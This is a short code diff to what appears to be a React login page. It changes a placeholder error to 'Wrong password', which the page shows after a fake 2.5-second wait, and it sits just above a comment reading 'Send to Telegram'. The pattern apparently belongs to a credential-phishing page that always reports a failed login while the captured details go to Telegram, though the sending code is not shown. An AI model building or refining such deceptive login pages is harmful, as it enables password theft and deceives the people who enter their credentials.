@@ -20,7 +20,7 @@ export function App() {
     await new Promise((resolve) => setTimeout(resolve, 2500));
 
     // Show wrong password error
-    setError("Sample Message");
+    setError("Wrong password");
     setIsLoading(false);
 
     // Send to Telegram
